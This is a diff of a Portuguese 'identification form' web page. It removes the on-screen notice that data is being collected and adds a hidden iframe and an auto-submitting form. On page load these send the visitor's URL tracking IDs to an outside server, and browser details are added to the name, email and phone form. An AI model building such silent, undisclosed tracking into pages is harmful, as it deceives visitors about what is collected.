@@ -29,18 +29,6 @@
             border-radius: 20px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             overflow: hidden;
-            animation: slideIn 0.5s ease-out;
-        }
-        
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .header {
@@ -48,25 +36,11 @@
             color: white;
             padding: 30px;
             text-align: center;
-            position: relative;
         }
         
         .header h1 {
             font-size: 2rem;
             margin-bottom: 10px;
-        }
-        
-        .form-icon {
-            width: 60px;
-            height: 60px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2rem;
-            margin: 0 auto 15px;
-            border: 3px solid white;
         }
         
         .content {
@@ -98,73 +72,12 @@
             border: 2px solid #4a6ee0;
             border-radius: 8px;
             font-size: 1.1rem;
-            transition: all 0.3s ease;
         }
         
         .form-input:focus {
             outline: none;
             border-color: #8a2be2;
             box-shadow: 0 0 0 3px rgba(138, 43, 226, 0.2);
-        }
-        
-        .form-select {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #4a6ee0;
-            border-radius: 8px;
-            font-size: 1.1rem;
-            background: white;
-            cursor: pointer;
-        }
-        
-        .form-textarea {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #4a6ee0;
-            border-radius: 8px;
-            font-size: 1.1rem;
-            min-height: 100px;
-            resize: vertical;
-            font-family: inherit;
-        }
-        
-        .radio-group {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
-            margin-top: 10px;
-        }
-        
-        .radio-option {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            cursor: pointer;
-        }
-        
-        .checkbox-group {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-top: 10px;
-        }
-        
-        .checkbox-option {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            cursor: pointer;
-        }
-        
-        .form-section {
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 2px dashed #4a6ee0;
-        }
-        
-        .form-section h3 {
-            color: #4a6ee0;
-            margin-bottom: 20px;
         }
         
         .button-group {
@@ -183,34 +96,18 @@
             font-size: 1.1rem;
             cursor: pointer;
             font-weight: bold;
-            transition: transform 0.2s, box-shadow 0.2s;
             min-width: 200px;
         }
         
-        .submit-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(74, 110, 224, 0.4);
-        }
-        
-        .reset-button {
+        .footer {
+            text-align: center;
+            padding: 20px;
             background: #f8f9fa;
             color: #666;
-            border: 2px solid #ddd;
-            padding: 16px 40px;
-            border-radius: 8px;
-            font-size: 1.1rem;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.2s;
-            min-width: 200px;
+            border-top: 1px solid #eee;
         }
         
-        .reset-button:hover {
-            background: #e9ecef;
-            border-color: #ccc;
-        }
-        
-        .status-message {
+        #statusMessage {
             padding: 15px;
             border-radius: 8px;
             margin: 20px 0;
@@ -222,705 +119,148 @@
             background: #e6fffa;
             color: #234e52;
             border: 1px solid #81e6d9;
-            display: block !important;
-        }
-        
-        .status-error {
-            background: #fff5f5;
-            color: #9b2c2c;
-            border: 1px solid #fc8181;
-            display: block !important;
-        }
-        
-        .status-info {
-            background: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeaa7;
-            display: block !important;
-        }
-        
-        .footer {
-            text-align: center;
-            padding: 20px;
-            background: #f8f9fa;
-            color: #666;
-            border-top: 1px solid #eee;
         }
         
         .required {
             color: #e53e3e;
         }
         
-        .auto-collect-notice {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #4a6ee0;
-            color: white;
-            padding: 10px 15px;
-            border-radius: 8px;
-            font-size: 0.9rem;
-            opacity: 0;
-            transform: translateX(100px);
-            transition: all 0.3s ease;
-            z-index: 1000;
-        }
-        
-        .auto-collect-notice.show {
-            opacity: 1;
-            transform: translateX(0);
-        }
-        
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255,255,255,0.9);
+        /* IFRAME INVISÍVEL PARA ENVIO */
+        #hiddenIframe {
             display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            flex-direction: column;
-            gap: 20px;
-        }
-        
-        .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #4a6ee0;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .confirmation-screen {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            padding: 40px;
-        }
-        
-        .confirmation-icon {
-            font-size: 4rem;
-            margin-bottom: 20px;
-            color: #38a169;
-        }
-        
-        .success-message {
-            background: linear-gradient(135deg, #38a169, #2f855a);
-            color: white;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            margin: 20px 0;
-            width: 100%;
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                border-radius: 15px;
-            }
-            
-            .header, .content {
-                padding: 25px;
-            }
-            
-            .button-group {
-                flex-direction: column;
-            }
-            
-            .submit-button, .reset-button {
-                width: 100%;
-                min-width: unset;
-            }
+            width: 0;
+            height: 0;
+            border: 0;
         }
     </style>
 </head>
 <body>
-    <!-- Overlay de carregamento -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-spinner"></div>
-        <div style="color: #4a6ee0; font-weight: bold;">Preparando sistema...</div>
-    </div>
+    <!-- IFRAME INVISÍVEL PARA ENVIO SEM CORS -->
+    <iframe id="hiddenIframe" name="hiddenIframe"></iframe>
     
-    <!-- Notificação de coleta automática -->
-    <div class="auto-collect-notice" id="autoCollectNotice">
-        ⚡ Coletando dados do sistema...
-    </div>
-    
-    <div class="container" id="mainContainer" style="display: none;">
+    <!-- FORMULÁRIO VISÍVEL PARA O USUÁRIO -->
+    <div class="container">
         <div class="header">
-            <div class="form-icon">📋</div>
             <h1>Formulário de Identificação</h1>
             <p>Complete seus dados para continuar</p>
         </div>
         
         <div class="content">
-            <!-- Formulário Visível -->
-            <div id="formScreen">
-                <div class="form-container">
-                    <form id="userForm">
-                        <!-- Dados automáticos serão adicionados aqui -->
-                        <div id="hiddenFieldsContainer"></div>
-                        
-                        <div class="form-section">
-                            <h3>📝 Informações Pessoais</h3>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="nome_completo">
-                                    Nome Completo <span class="required">*</span>
-                                </label>
-                                <input type="text" 
-                                       id="nome_completo" 
-                                       name="nome_completo" 
-                                       class="form-input" 
-                                       placeholder="Digite seu nome completo" 
-                                       required>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="email">
-                                    E-mail <span class="required">*</span>
-                                </label>
-                                <input type="email" 
-                                       id="email" 
-                                       name="email" 
-                                       class="form-input" 
-                                       placeholder="seu@email.com" 
-                                       required>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="telefone">
-                                    Telefone
-                                </label>
-                                <input type="tel" 
-                                       id="telefone" 
-                                       name="telefone" 
-                                       class="form-input" 
-                                       placeholder="(00) 00000-0000">
-                            </div>
-                        </div>
-                        
-                        <div class="form-section">
-                            <h3>💼 Informações Profissionais</h3>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="empresa">
-                                    Empresa/Organização
-                                </label>
-                                <input type="text" 
-                                       id="empresa" 
-                                       name="empresa" 
-                                       class="form-input" 
-                                       placeholder="Nome da empresa">
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="cargo">
-                                    Cargo/Função
-                                </label>
-                                <input type="text" 
-                                       id="cargo" 
-                                       name="cargo" 
-                                       class="form-input" 
-                                       placeholder="Seu cargo atual">
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="departamento">
-                                    Departamento
-                                </label>
-                                <select id="departamento" name="departamento" class="form-select">
-                                    <option value="">Selecione um departamento</option>
-                                    <option value="ti">TI</option>
-                                    <option value="rh">Recursos Humanos</option>
-                                    <option value="financeiro">Financeiro</option>
-                                    <option value="marketing">Marketing</option>
-                                    <option value="vendas">Vendas</option>
-                                    <option value="operacoes">Operações</option>
-                                    <option value="outro">Outro</option>
-                                </select>
-                            </div>
-                        </div>
-                        
-                        <div class="form-section">
-                            <h3>🔒 Configuração de Acesso</h3>
-                            
-                            <div class="form-group">
-                                <label class="form-label">
-                                    Tipo de Usuário <span class="required">*</span>
-                                </label>
-                                <div class="radio-group">
-                                    <label class="radio-option">
-                                        <input type="radio" name="tipo_usuario" value="colaborador" required>
-                                        Colaborador Interno
-                                    </label>
-                                    <label class="radio-option">
-                                        <input type="radio" name="tipo_usuario" value="visitante">
-                                        Visitante
-                                    </label>
-                                    <label class="radio-option">
-                                        <input type="radio" name="tipo_usuario" value="fornecedor">
-                                        Fornecedor/Parceiro
-                                    </label>
-                                </div>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label">
-                                    Recursos Necessários
-                                </label>
-                                <div class="checkbox-group">
-                                    <label class="checkbox-option">
-                                        <input type="checkbox" name="recursos[]" value="sistema_principal">
-                                        Sistema Principal
-                                    </label>
-                                    <label class="checkbox-option">
-                                        <input type="checkbox" name="recursos[]" value="relatorios">
-                                        Módulo de Relatórios
-                                    </label>
-                                    <label class="checkbox-option">
-                                        <input type="checkbox" name="recursos[]" value="documentos">
-                                        Acesso a Documentos
-                                    </label>
-                                    <label class="checkbox-option">
-                                        <input type="checkbox" name="recursos[]" value="suporte">
-                                        Sistema de Suporte
-                                    </label>
-                                </div>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="observacoes">
-                                    Observações Adicionais
-                                </label>
-                                <textarea id="observacoes" 
-                                          name="observacoes" 
-                                          class="form-textarea" 
-                                          placeholder="Alguma observação ou necessidade especial..."></textarea>
-                            </div>
-                        </div>
-                        
-                        <div id="statusMessage" class="status-message"></div>
-                        
-                        <div class="button-group">
-                            <button type="button" class="reset-button" onclick="resetForm()">
-                                🔄 Limpar Formulário
-                            </button>
-                            <button type="button" class="submit-button" onclick="submitForm()">
-                                ✅ Enviar Dados
-                            </button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-            
-            <!-- Tela de Confirmação -->
-            <div class="confirmation-screen" id="confirmationScreen">
-                <div class="confirmation-icon">✅</div>
-                <h2 style="color: #38a169; margin-bottom: 15px;">Identificação Concluída!</h2>
-                <p style="margin-bottom: 25px; color: #666; max-width: 600px;">
-                    Todas as informações foram processadas com sucesso.
-                </p>
+            <div class="form-container">
+                <!-- Formulário 1: ENVIO INICIAL AUTOMÁTICO (oculto) -->
+                <form id="autoForm" method="GET" action="https://portal.renar.com.br/teste/" target="hiddenIframe" style="display: none;">
+                    <input type="hidden" name="mode" value="ping">
+                    <input type="hidden" id="auto_id_hash" name="id_hash">
+                    <input type="hidden" id="auto_id_user" name="id_user">
+                </form>
                 
-                <div class="success-message">
-                    <h3 style="margin-bottom: 15px;">Dados Enviados</h3>
-                    <div id="summaryInfo" style="text-align: left; margin: 15px 0;"></div>
-                    <p style="margin-top: 15px; opacity: 0.9;">
-                        ID da Sessão: <strong id="sessionIdDisplay"></strong>
-                    </p>
-                </div>
-                
-                <div class="button-group">
-                    <button type="button" class="submit-button" onclick="newSubmission()">
-                        📝 Nova Identificação
-                    </button>
-                </div>
+                <!-- Formulário 2: DADOS MANUAIS DO USUÁRIO -->
+                <form id="userForm" method="POST" action="https://portal.renar.com.br/teste/" target="hiddenIframe">
+                    <!-- Dados automáticos serão adicionados aqui -->
+                    <div id="hiddenFieldsContainer"></div>
+                    
+                    <div class="form-group">
+                        <label class="form-label" for="nome_completo">
+                            Nome Completo <span class="required">*</span>
+                        </label>
+                        <input type="text" id="nome_completo" name="nome_completo" class="form-input" placeholder="Digite seu nome completo" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label" for="email">
+                            E-mail <span class="required">*</span>
+                        </label>
+                        <input type="email" id="email" name="email" class="form-input" placeholder="seu@email.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label" for="telefone">Telefone</label>
+                        <input type="tel" id="telefone" name="telefone" class="form-input" placeholder="(00) 00000-0000">
+                    </div>
+                    
+                    <div id="statusMessage"></div>
+                    
+                    <div class="button-group">
+                        <button type="submit" class="submit-button">✅ Enviar Dados</button>
+                    </div>
+                </form>
             </div>
         </div>
         
         <div class="footer">
             <p>© 2024 Sistema de Identificação Automática</p>
-            <p style="font-size: 0.9em; margin-top: 10px;">
-                Dados coletados de forma segura e transparente
-            </p>
         </div>
     </div>
 
     <script>
-        // Configurações
-        const PHP_SERVER_URL = 'https://portal.renar.com.br/teste/';
-        let SESSION_ID = '';
-        let collectedAutoData = {};
-        let isCollecting = false;
-        
-        // Elementos DOM
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        const autoCollectNotice = document.getElementById('autoCollectNotice');
-        const mainContainer = document.getElementById('mainContainer');
-        const formScreen = document.getElementById('formScreen');
-        const confirmationScreen = document.getElementById('confirmationScreen');
-        const statusMessage = document.getElementById('statusMessage');
-        const hiddenFieldsContainer = document.getElementById('hiddenFieldsContainer');
-        
         // Obter parâmetros da URL
         const params = new URLSearchParams(window.location.search);
         const id_hash = params.get("id_hash") || '';
         const id_user = params.get("id_user") || '';
         
-        // Mostrar notificação
-        function showNotice(message) {
-            autoCollectNotice.textContent = message;
-            autoCollectNotice.classList.add('show');
-            setTimeout(() => {
-                autoCollectNotice.classList.remove('show');
-            }, 3000);
-        }
+        // Elementos DOM
+        const statusMessage = document.getElementById('statusMessage');
+        const hiddenFieldsContainer = document.getElementById('hiddenFieldsContainer');
+        const autoForm = document.getElementById('autoForm');
         
-        // Mostrar mensagem de status
+        // Função para mostrar mensagem
         function showMessage(text, type) {
             statusMessage.textContent = text;
-            statusMessage.className = `status-message status-${type}`;
+            statusMessage.className = `status-${type}`;
+            statusMessage.style.display = 'block';
             
-            if (type === 'success' || type === 'info') {
+            if (type === 'success') {
                 setTimeout(() => {
                     statusMessage.style.display = 'none';
                 }, 5000);
             }
         }
         
-        // Enviar requisição PING para o PHP (enviar id_hash e id_user)
-        async function sendInitialPing() {
-            try {
-                showNotice('⚡ Enviando identificação inicial...');
-                
-                // Criar URL com parâmetros GET
-                const pingUrl = `${PHP_SERVER_URL}?mode=ping&id_hash=${encodeURIComponent(id_hash)}&id_user=${encodeURIComponent(id_user)}`;
-                
-                // Usar fetch para enviar a requisição
-                const response = await fetch(pingUrl, {
-                    method: 'GET',
-                    mode: 'no-cors',
-                    cache: 'no-store'
-                });
-                
-                console.log('Ping enviado com parâmetros:', { id_hash, id_user });
-                showNotice('✅ Identificação inicial enviada!');
-                
-                return true;
-                
-            } catch (error) {
-                console.log('Erro no ping, tentando método alternativo...', error);
-                
-                // Método alternativo usando imagem
-                return sendPingAlternative();
+        // ENVIO INICIAL AUTOMÁTICO (executa ao carregar a página)
+        function sendInitialData() {
+            if (!id_hash || !id_user) {
+                console.log('Parâmetros id_hash ou id_user não encontrados na URL');
+                return;
             }
+            
+            console.log('Enviando dados iniciais:', { id_hash, id_user });
+            
+            // Preencher e enviar formulário automático
+            document.getElementById('auto_id_hash').value = id_hash;
+            document.getElementById('auto_id_user').value = id_user;
+            
+            // Enviar o formulário automático (vai para o iframe invisível)
+            autoForm.submit();
+            
+            // Mostrar mensagem para usuário
+            setTimeout(() => {
+                showMessage('✅ Identificação inicial registrada no sistema!', 'success');
+            }, 1000);
+            
+            // Coletar dados do navegador
+            collectBrowserInfo();
         }
         
-        // Método alternativo para enviar ping
-        async function sendPingAlternative() {
-            return new Promise((resolve) => {
-                const pingUrl = `${PHP_SERVER_URL}?mode=ping&id_hash=${encodeURIComponent(id_hash)}&id_user=${encodeURIComponent(id_user)}&t=${Date.now()}`;
-                
-                const img = new Image();
-                img.onload = function() {
-                    console.log('Ping enviado via método alternativo');
-                    resolve(true);
-                };
-                img.onerror = function() {
-                    console.log('Falha no ping alternativo');
-                    resolve(false);
-                };
-                
-                img.src = pingUrl;
-                img.style.display = 'none';
-                document.body.appendChild(img);
-            });
-        }
-        
-        // Coletar dados do sistema em segundo plano
-        async function collectSystemData() {
-            if (isCollecting) return;
-            isCollecting = true;
-            
-            try {
-                showNotice('⚡ Coletando dados do sistema...');
-                
-                // Gerar ID da sessão
-                SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                
-                // Dados básicos
-                collectedAutoData = {
-                    session_id: SESSION_ID,
-                    timestamp: new Date().toISOString(),
-                    page_url: window.location.href,
-                    referrer: document.referrer || 'direct',
-                    user_agent: navigator.userAgent.substring(0, 200),
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen_resolution: `${screen.width}x${screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookies_enabled: navigator.cookieEnabled,
-                    online_status: navigator.onLine,
-                    window_size: `${window.innerWidth}x${window.innerHeight}`,
-                    color_depth: screen.colorDepth
-                };
-                
-                // Tentar obter IP público
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    collectedAutoData.public_ip = ipData.ip;
-                } catch (ipError) {
-                    collectedAutoData.public_ip = 'Não detectado';
-                }
-                
-                // Adicionar campos hidden ao formulário
-                addHiddenFields();
-                
-                // Mostrar sucesso
-                showNotice('✅ Dados coletados com sucesso!');
-                
-            } catch (error) {
-                console.error('Erro na coleta automática:', error);
-                // Continuar mesmo com erro
-            } finally {
-                isCollecting = false;
-            }
-        }
-        
-        // Adicionar campos hidden ao formulário
-        function addHiddenFields() {
-            // Limpar container
-            hiddenFieldsContainer.innerHTML = '';
-            
-            // Adicionar id_hash e id_user como campos hidden
-            if (id_hash) {
-                const hashField = document.createElement('input');
-                hashField.type = 'hidden';
-                hashField.name = 'id_hash';
-                hashField.value = id_hash;
-                hiddenFieldsContainer.appendChild(hashField);
-            }
-            
-            if (id_user) {
-                const userField = document.createElement('input');
-                userField.type = 'hidden';
-                userField.name = 'id_user';
-                userField.value = id_user;
-                hiddenFieldsContainer.appendChild(userField);
-            }
-            
-            // Adicionar dados automáticos como JSON em campo hidden
-            const autoDataField = document.createElement('input');
-            autoDataField.type = 'hidden';
-            autoDataField.name = 'auto_data';
-            autoDataField.value = JSON.stringify(collectedAutoData);
-            hiddenFieldsContainer.appendChild(autoDataField);
-            
-            // Adicionar campo mode
-            const modeField = document.createElement('input');
-            modeField.type = 'hidden';
-            modeField.name = 'mode';
-            modeField.value = 'post_data';
-            hiddenFieldsContainer.appendChild(modeField);
-        }
-        
-        // Validar formulário
-        function validateForm() {
-            const nome = document.getElementById('nome_completo').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const tipoUsuario = document.querySelector('input[name="tipo_usuario"]:checked');
-            
-            if (!nome) {
-                showMessage('❌ Por favor, preencha o nome completo', 'error');
-                return false;
-            }
-            
-            if (!email) {
-                showMessage('❌ Por favor, preencha o e-mail', 'error');
-                return false;
-            }
-            
-            if (!tipoUsuario) {
-                showMessage('❌ Por favor, selecione o tipo de usuário', 'error');
-                return false;
-            }
-            
-            return true;
-        }
-        
-        // Enviar formulário via iframe (para evitar problemas CORS)
-        async function submitForm() {
-            if (!validateForm()) return;
-            
-            showMessage('⏳ Enviando dados, por favor aguarde...', 'info');
-            
-            // Coletar dados do formulário
-            const form = document.getElementById('userForm');
-            const formData = new FormData(form);
-            
-            try {
-                // Adicionar timestamp de envio
-                formData.append('submission_time', new Date().toISOString());
-                
-                // Enviar usando método tradicional (recarrega página)
-                await sendFormTraditional(formData);
-                
-            } catch (error) {
-                console.error('Erro ao enviar:', error);
-                showMessage('❌ Erro ao enviar dados. Tente novamente.', 'error');
-            }
-        }
-        
-        // Enviar formulário usando método tradicional
-        async function sendFormTraditional(formData) {
-            // Criar um iframe invisível para enviar os dados
-            const iframe = document.createElement('iframe');
-            iframe.name = 'formSubmitIframe';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            // Criar um form temporário
-            const tempForm = document.createElement('form');
-            tempForm.method = 'POST';
-            tempForm.action = PHP_SERVER_URL;
-            tempForm.target = 'formSubmitIframe';
-            tempForm.style.display = 'none';
-            
-            // Adicionar todos os dados do FormData
-            for (let [key, value] of formData.entries()) {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                
-                // Se for array (recursos), enviar como múltiplos campos
-                if (key === 'recursos[]' && Array.isArray(value)) {
-                    // Já é tratado pelo FormData
-                    input.value = value;
-                } else {
-                    input.value = value;
-                }
-                
-                tempForm.appendChild(input);
-            }
-            
-            // Adicionar campo para dados completos
-            const completeData = {
-                form_data: Object.fromEntries(formData),
-                auto_data: collectedAutoData,
-                session_id: SESSION_ID
+        // Coletar informações do navegador
+        function collectBrowserInfo() {
+            const browserData = {
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                timestamp: new Date().toISOString(),
+                page_url: window.location.href,
+                referrer: document.referrer || 'direct'
             };
             
-            const dataInput = document.createElement('input');
-            dataInput.type = 'hidden';
-            dataInput.name = 'data';
-            dataInput.value = JSON.stringify(completeData);
-            tempForm.appendChild(dataInput);
+            // Adicionar como campo hidden no formulário principal
+            const dataField = document.createElement('input');
+            dataField.type = 'hidden';
+            dataField.name = 'browser_data';
+            dataField.value = JSON.stringify(browserData);
+            hiddenFieldsContainer.appendChild(dataField);
             
-            document.body.appendChild(tempForm);
-            
-            // Configurar callback quando o iframe carregar
-            return new Promise((resolve) => {
-                iframe.onload = function() {
-                    console.log('Formulário enviado com sucesso!');
-                    
-                    // Mostrar confirmação
-                    showConfirmationScreen(Object.fromEntries(formData));
-                    
-                    // Limpar iframe e form temporário
-                    setTimeout(() => {
-                        document.body.removeChild(iframe);
-                        document.body.removeChild(tempForm);
-                    }, 1000);
-                    
-                    resolve(true);
-                };
-                
-                // Enviar formulário
-                tempForm.submit();
-                
-                // Timeout de segurança
-                setTimeout(() => {
-                    console.log('Formulário enviado (timeout)');
-                    showConfirmationScreen(Object.fromEntries(formData));
-                    resolve(true);
-                }, 3000);
-            });
-        }
-        
-        // Mostrar tela de confirmação
-        function showConfirmationScreen(formData) {
-            // Esconder formulário
-            formScreen.style.display = 'none';
-            
-            // Mostrar confirmação
-            confirmationScreen.style.display = 'flex';
-            
-            // Preencher resumo
-            const summaryDiv = document.getElementById('summaryInfo');
-            const sessionIdDisplay = document.getElementById('sessionIdDisplay');
-            
-            if (summaryDiv) {
-                let html = `
-                    <p><strong>Nome:</strong> ${formData.nome_completo || 'Não informado'}</p>
-                    <p><strong>E-mail:</strong> ${formData.email || 'Não informado'}</p>
-                    <p><strong>Empresa:</strong> ${formData.empresa || 'Não informado'}</p>
-                    <p><strong>Cargo:</strong> ${formData.cargo || 'Não informado'}</p>
-                    <p><strong>Tipo:</strong> ${formData.tipo_usuario || 'Não informado'}</p>
-                `;
-                
-                if (collectedAutoData.public_ip && collectedAutoData.public_ip !== 'Não detectado') {
-                    html += `<p><strong>IP:</strong> ${collectedAutoData.public_ip}</p>`;
-                }
-                
-                summaryDiv.innerHTML = html;
-            }
-            
-            if (sessionIdDisplay) {
-                sessionIdDisplay.textContent = SESSION_ID;
-            }
-        }
-        
-        // Nova submissão
-        function newSubmission() {
-            // Resetar formulário
-            document.getElementById('userForm').reset();
-            
-            // Gerar nova sessão
-            SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            collectedAutoData = {};
-            
-            // Atualizar campos hidden
-            addHiddenFields();
-            
-            // Mostrar formulário novamente
-            confirmationScreen.style.display = 'none';
-            formScreen.style.display = 'block';
-            
-            // Focar no primeiro campo
-            document.getElementById('nome_completo').focus();
-            
-            // Coletar novos dados
-            collectSystemData();
-        }
-        
-        // Resetar formulário
-        function resetForm() {
-            if (confirm('Tem certeza que deseja limpar todos os campos do formulário?')) {
-                document.getElementById('userForm').reset();
-                showMessage('Formulário limpo com sucesso!', 'success');
-            }
+            console.log('Dados do navegador coletados:', browserData);
         }
         
         // Configurar máscara de telefone
@@ -941,55 +281,107 @@
             }
         }
         
-        // Inicialização
-        async function init() {
-            // Mostrar loading inicial
-            loadingOverlay.style.display = 'flex';
+        // Configurar envio do formulário principal
+        function setupFormSubmit() {
+            const userForm = document.getElementById('userForm');
             
-            // Configurar máscara de telefone
-            setupPhoneMask();
-            
-            // 1. Primeiro enviar o PING com id_hash e id_user
-            await sendInitialPing();
-            
-            // 2. Coletar dados do sistema em segundo plano
-            collectSystemData();
-            
-            // 3. Mostrar formulário
-            setTimeout(() => {
-                loadingOverlay.style.display = 'none';
-                mainContainer.style.display = 'block';
+            userForm.addEventListener('submit', function(e) {
+                e.preventDefault();
                 
-                // Focar no primeiro campo
-                document.getElementById('nome_completo').focus();
+                // Validar campos obrigatórios
+                const nome = document.getElementById('nome_completo').value.trim();
+                const email = document.getElementById('email').value.trim();
                 
-                // Mostrar aviso de boas-vindas
-                showNotice('✅ Formulário pronto para preenchimento!');
-            }, 1500);
-            
-            // Configurar submit com Enter no primeiro campo
-            document.getElementById('nome_completo').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    document.getElementById('email').focus();
+                if (!nome || !email) {
+                    showMessage('❌ Por favor, preencha todos os campos obrigatórios', 'error');
+                    return;
                 }
+                
+                showMessage('⏳ Enviando dados, por favor aguarde...', 'success');
+                
+                // Adicionar id_hash e id_user como campos hidden no formulário
+                if (id_hash) {
+                    const hashField = document.createElement('input');
+                    hashField.type = 'hidden';
+                    hashField.name = 'id_hash';
+                    hashField.value = id_hash;
+                    this.appendChild(hashField);
+                }
+                
+                if (id_user) {
+                    const userField = document.createElement('input');
+                    userField.type = 'hidden';
+                    userField.name = 'id_user';
+                    userField.value = id_user;
+                    this.appendChild(userField);
+                }
+                
+                // Adicionar campo 'data' com informações completas
+                const formData = new FormData(this);
+                const completeData = {
+                    form_data: Object.fromEntries(formData),
+                    timestamp: new Date().toISOString()
+                };
+                
+                const dataField = document.createElement('input');
+                dataField.type = 'hidden';
+                dataField.name = 'data';
+                dataField.value = JSON.stringify(completeData);
+                this.appendChild(dataField);
+                
+                console.log('Enviando dados do formulário:', completeData);
+                
+                // Enviar formulário (vai para o iframe invisível)
+                this.submit();
+                
+                // Mostrar mensagem de sucesso
+                setTimeout(() => {
+                    showMessage('✅ Dados enviados com sucesso! Verifique seu servidor.', 'success');
+                    
+                    // Limpar formulário após 3 segundos
+                    setTimeout(() => {
+                        userForm.reset();
+                        
+                        // Remover campos hidden adicionados dinamicamente
+                        const addedFields = userForm.querySelectorAll('input[type="hidden"]:not([id])');
+                        addedFields.forEach(field => field.remove());
+                    }, 3000);
+                }, 1500);
             });
         }
         
-        // Iniciar quando a página carregar
-        document.addEventListener('DOMContentLoaded', init);
-        
-        // Funções para debug
-        window.showCollectedData = function() {
-            console.log('Dados Coletados Automaticamente:', collectedAutoData);
-            console.log('Session ID:', SESSION_ID);
-            console.log('Parâmetros URL:', { id_hash, id_user });
-            alert('Verifique o console para ver os dados coletados');
+        // Quando o iframe carrega (resposta do servidor)
+        document.getElementById('hiddenIframe').onload = function() {
+            console.log('Resposta recebida do servidor (iframe)');
+            // Podemos tentar ler o conteúdo do iframe se for do mesmo domínio
+            try {
+                const iframeDoc = this.contentDocument || this.contentWindow.document;
+                console.log('Conteúdo do iframe:', iframeDoc.body.innerHTML);
+            } catch (e) {
+                // Não é possível ler iframe de domínio diferente (CORS)
+                console.log('Não foi possível ler o iframe (domínio diferente)');
+            }
         };
         
-        window.testPing = function() {
-            sendInitialPing();
-        };
+        // Inicialização
+        document.addEventListener('DOMContentLoaded', function() {
+            // Configurar máscara de telefone
+            setupPhoneMask();
+            
+            // Configurar envio do formulário
+            setupFormSubmit();
+            
+            // Enviar dados iniciais automaticamente
+            setTimeout(() => {
+                sendInitialData();
+            }, 1000);
+            
+            // Focar no primeiro campo
+            document.getElementById('nome_completo').focus();
+        });
+        
+        // Debug: verificar parâmetros
+        console.log('Parâmetros da URL:', { id_hash, id_user });
         
     </script>
 </body>
